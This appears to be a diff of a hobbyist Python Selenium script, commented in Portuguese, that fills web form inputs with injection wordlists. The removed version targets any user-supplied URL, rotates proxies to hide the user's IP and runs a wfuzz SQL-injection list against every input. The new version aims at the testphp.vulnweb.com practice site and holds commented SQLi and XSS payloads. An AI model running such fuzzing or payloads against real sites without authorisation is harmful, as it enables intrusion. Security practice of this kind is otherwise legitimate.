@@ -1,151 +1,66 @@
 #!/usr/bin/env python3
-import requests
-import time
-import random
-import threading
-from webdriver_manager.chrome import ChromeDriverManager
 from selenium import webdriver
+from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
-from bs4 import BeautifulSoup
-import string
+from time import sleep
+import random
 
-img= """
-_________     ________________________________  _________  ____  __.
-\_   ___ \   /  _  \__    ___/\__    ___/  _  \ \_   ___ \|    |/ _|
-/    \  \/  /  /_\  \|    |     |    | /  /_\  \/    \  \/|      <  
-\     \____/    |    \    |     |    |/    |    \     \___|    |  \ 
- \______  /\____|__  /____|     |____|\____|__  /\______  /____|__ \
 
-        \/         \/                         \/        \/        \/
-"""
-
-print(img)
-
-pergunta = input("Deseja iniciar a busca? (sim/nao): ").lower()
-
-if pergunta == "sim":
-    # Pergunta ao usuário pelo URL alvo
-    site_url = input("Por favor, insira o URL do site que deseja varrer: ")
-    # Aqui você pode adicionar alguma validação para garantir que o URL seja válido
-    
-    # Função para medir o tempo de resposta de uma API
-    def medir_tempo_resposta(api_url):
-        inicio = time.time()
-        response = requests.get(api_url)
-        fim = time.time()
-        tempo_resposta = fim - inicio
-        return response.status_code, tempo_resposta
-
-    # Função para ofuscar o IP usando proxies
-    def obter_proxy():
-        proxies_list = [
-            'http://proxy1.com:8080', 
-            'http://proxy2.com:8080', 
-            'http://proxy3.com:8080'
-        ]
-        return {
-            'http': random.choice(proxies_list), 
-            'https': random.choice(proxies_list),
-        }
-
-    # Configurar o Selenium com opções
-    options = Options()
+def setup_webdriver():
     service = Service(ChromeDriverManager().install())
-    driver = webdriver.Chrome(service=service, options=options)
+    options = Options()
+    options.add_argument("window-size=1200,1200")
+    navegador = webdriver.Chrome(service=service, options=options)
+    navegador.get("http://testphp.vulnweb.com/login.php")
+    sleep(3)
+   # accept_cookies(navegador)
+    interactions(navegador)
 
-    print("Iniciando varredura.....")
+#def accept_cookies(navegador):
+   # try:
+      #  navegador.find_element(By.XPATH, "//button[contains(text(), 'OK')]").click()
+   # except:
+      #  print("Erro ao acessar o botão de Cookies!")
 
-    driver.get(site_url)
-    time.sleep(5)
+def carregar_wordlist(filepath):
+    with open (filepath, 'r') as file:
+        return [line.strip() for line in file]
 
-    # Usar BeautifulSoup para analisar o HTML
-    soup = BeautifulSoup(driver.page_source, 'html.parser')
+def interactions(navegador):
+    try:
+        wordlist = carregar_wordlist("caminho/para/sua/wordlist")
+        inputs = navegador.find_elements(By.TAG_NAME, "input")
+        for input in inputs:
+            #input.send_keys("admin' '1' or '1") Você pode escolher ou automatizar.
+            #input.send_keys("<script>alert()</script>")
+            word = random.choice(wordlist)
+            input.send_keys(word)
 
-    # Encontrar URLs de APIs (exemplo)
-    api_urls = [a['href'] for a in soup.find_all('a', href=True) if 'api' in a['href']]  # Filtrar links de APIs
+            attributes_to_check = [
+                input.get_attribute("placeholder"),
+                input.get_attribute("id"),
+                input.get_attribute("class"),
+                input.get_attribute("name"),
+                input.get_attribute("type")
+            ]
+            if any(attr and ("email" in attr or "e-mail" in attr) for attr in attributes_to_check):
+                input.send_keys("exemplo" + "@gmail.com")
+        
+        sleep(4)
+        input.submit()
+        sleep(4)
 
-    # Função para testar SQL Injection usando uma wordlist
-    def testar_sql_injection(input_element):
-        wordlist_path = '/usr/share/wordlists/wfuzz/Injections/SQL.txt'
-        with open(wordlist_path, 'r') as f:
-            wordlist = f.read().splitlines()
+    except Exception as error:
+        print(f"Erro ao fazer busca! {error}")
 
-        resultados = []
+    finally:
+        print("Navegador Fechado!")
+        sleep(4)
+        navegador.quit()    
 
-        for palavra in wordlist:
-            input_element.send_keys(palavra)  # Inserir palavra da wordlist no input
-            driver.find_element_by_id('submit_button').click()  # Substitua pelo ID do botão de envio
+def main():
+    setup_webdriver()
 
-            # Verificar o status da resposta após o envio
-            response_status = driver.page_source  # Obter o código-fonte da página após o envio
-            resultados.append((palavra, response_status))
-
-        return resultados
-
-    # Verificar inputs no site para testar SQL Injection
-    input_elements = soup.find_all('input')  # Encontrar todos os elementos de input
-    button_elements = soup.find_all('button')
-    box_elements = soup.find_all(class_='box')  # Elementos com a classe 'box'
-    valores_omitir = ["1","0","","None","none","yes","no"]
-
-    def varredura():
-        for idx, input_element in enumerate(input_elements):
-            value = input_element.get('value')  # Obtém o valor
-           
-            input_attributes = {}
-            # Adiciona atributos apenas se eles existirem
-            if input_element.get('id'):
-                input_attributes['ID'] = input_element.get('id')
-            if input_element.get('name'):
-                input_attributes['NAME'] = input_element.get('name')
-            if input_element.get('type'):
-                input_attributes['TYPE'] = input_element.get('type')
-            if input_element.get('placeholder'):
-                input_attributes['placeholder'] = input_element.get('placeholder')
-            
-            if value is not None and value not in valores_omitir:
-                input_attributes['value'] = value  # Só adiciona se não for indesejado
-
-            print(f"Input {idx + 1}: {input_attributes}")
-            
-        for idx, button_element in enumerate(button_elements):
-            button_text = button_element.get_text(strip=True)  # Pega o texto do botão
-            if button_text and button_element != None:
-                print(f"Botão {idx + 1}: {button_text}")     
-                
-    print("Dados coletados!\n\n")
-
-    varredura()
-
-    # Testar cada input encontrado para SQL Injection
-    for input_element in input_elements:
-        resultados = testar_sql_injection(input_element)
-        for resultado in resultados:
-            print(f"Palavra: {resultado[0]}, Resultado: {resultado[1]}")
-
-    # Usar threads para paralelizar requisições GET para as APIs encontradas
-    # Continuação do código anterior
-
-    # Usar threads para paralelizar requisições GET para as APIs encontradas
-    def testar_api(api_url):
-        status, tempo_resposta = medir_tempo_resposta(api_url)
-        print(f"API: {api_url}, Status: {status}, Tempo de Resposta: {tempo_resposta:.2f} segundos")
-
-    threads = []
-
-    for api_url in api_urls:
-        t = threading.Thread(target=testar_api, args=(api_url,))
-        threads.append(t)
-        t.start()
-
-    # Aguardar que todas as threads terminem
-    for t in threads:
-        t.join()
-
-    driver.quit()
-
-elif pergunta == "nao":
-    print("Programa encerrado.")
-else:
-    print("Opção inválida. Programa encerrado.")
+main()
